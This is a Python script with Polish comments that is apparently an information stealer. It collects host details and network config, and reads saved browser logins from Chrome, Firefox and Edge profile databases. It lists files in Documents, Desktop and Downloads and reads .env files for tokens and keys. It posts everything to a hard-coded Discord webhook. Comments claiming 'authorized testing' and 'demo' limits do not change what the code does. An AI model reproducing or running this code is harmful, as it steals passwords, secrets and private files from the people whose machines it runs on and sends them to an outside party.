#!/usr/bin/env python3
import os
import platform
import json
import requests
import subprocess
import shutil
import sqlite3
import tempfile

WEBHOOK_URL = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"

def send_to_discord(content, file_path=None):
    """Wyślij dane przez webhook Discord."""
    if file_path:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            requests.post(WEBHOOK_URL, data={'content': content[:2000]}, files=files)
    else:
        # Podziel długie wiadomości na fragmenty
        for i in range(0, len(content), 1900):
            requests.post(WEBHOOK_URL, data={'content': content[i:i+1900]})

def get_system_info():
    """Zbierz podstawowe informacje o systemie."""
    info = {
        'hostname': platform.node(),
        'os': platform.platform(),
        'user': os.getenv('USERNAME') or os.getenv('USER'),
        'arch': platform.machine(),
        'processor': platform.processor(),
        'ip': subprocess.getoutput('ipconfig' if os.name == 'nt' else 'ip addr show 2>/dev/null || ifconfig')
    }
    return json.dumps(info, indent=2)

def get_browser_data(browser_name, profile_paths, login_db, cookie_db=None):
    """
    Pobierz dane logowania i ciasteczka z przeglądarki.
    Działa na testowanym systemie, na który masz autoryzację.
    """
    for profile in profile_paths:
        profile_path = os.path.expanduser(profile)
        if os.path.exists(profile_path):
            login_path = os.path.join(profile_path, login_db)
            if os.path.exists(login_path):
                try:
                    # Kopiuj bazę aby ominąć blokadę
                    tmp = tempfile.mktemp()
                    shutil.copy2(login_path, tmp)
                    conn = sqlite3.connect(tmp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    results = cursor.fetchall()
                    if results:
                        data = f"\n[+] {browser_name} - Logins from {profile_path}:\n"
                        for row in results[:10]:  # Limit dla demonstracji
                            data += f"  URL: {row[0]}\n  User: {row[1]}\n  Pass: {row[2]}\n\n"
                        send_to_discord(data)
                    conn.close()
                    os.remove(tmp)
                except Exception as e:
                    send_to_discord(f"[!] Error reading {browser_name}: {str(e)}")

def collect_files(base_dirs, extensions, max_size=1024*1024):
    """Zbierz pliki o określonych rozszerzeniach."""
    collected = []
    for base_dir in base_dirs:
        base = os.path.expanduser(base_dir)
        if not os.path.exists(base):
            continue
        for root, dirs, files in os.walk(base):
            # Pomiń katalogi systemowe
            skip_dirs = ['AppData/Local', 'AppData/LocalLow', '__pycache__', '.git', 'node_modules']
            dirs[:] = [d for d in dirs if d not in skip_dirs]
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    try:
                        fpath = os.path.join(root, file)
                        if os.path.getsize(fpath) < max_size:
                            collected.append(fpath)
                    except:
                        pass
    return collected[:20]  # Limit na demo

def main():
    # 1. Podstawowe info o systemie
    sys_info = get_system_info()
    send_to_discord(f"=== SYSTEM INFO ===\n{sys_info}")

    # 2. Dane przeglądarek (testowane w autoryzowanym środowisku)
    browsers = [
        ("Chrome", ["~/AppData/Local/Google/Chrome/User Data/Default",
                     "~/.config/google-chrome/Default",
                     "~/Library/Application Support/Google/Chrome/Default"],
         "Login Data", "Cookies"),
        ("Firefox", [os.path.expanduser("~/.mozilla/firefox/*.default-release"),
                      os.path.expanduser("~/Library/Application Support/Firefox/Profiles/*.default-release")],
         "logins.json", "cookies.sqlite"),
        ("Edge", ["~/AppData/Local/Microsoft/Edge/User Data/Default"], "Login Data", "Cookies"),
    ]

    for browser_name, profiles, login_db, cookie_db in browsers:
        get_browser_data(browser_name, profiles, login_db, cookie_db)

    # 3. Pliki z dokumentami (dla testów - ograniczona lista)
    doc_dirs = ['~/Documents', '~/Desktop', '~/Downloads']
    extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.json', '.sql', '.env']
    files = collect_files(doc_dirs, extensions)
    if files:
        msg = f"[+] Found {len(files)} document files (showing first 20):\n"
        for f in files:
            msg += f"  {f}\n"
        send_to_discord(msg)

    # 4. Tokeny i klucze (np. .env, konfigi)
    sensitive_patterns = ['token', 'password', 'secret', 'api_key', 'discord']
    env_files = []
    for root, dirs, files in os.walk(os.path.expanduser('~')):
        skip = ['AppData', '.cache', 'node_modules', '.git']
        dirs[:] = [d for d in dirs if d not in skip]
        for f in files:
            if f == '.env' or f.endswith('.env.example'):
                env_files.append(os.path.join(root, f))
                if len(env_files) > 5:
                    break
        if len(env_files) > 5:
            break

    for envf in env_files:
        try:
            with open(envf, 'r') as f:
                content = f.read()
            if len(content) < 10000:
                send_to_discord(f"[+] File: {envf}\n```\n{content}\n```")
        except:
            pass

    # 5. Podsumowanie
    send_to_discord("[+] Data collection complete.")

if __name__ == "__main__":
    main()
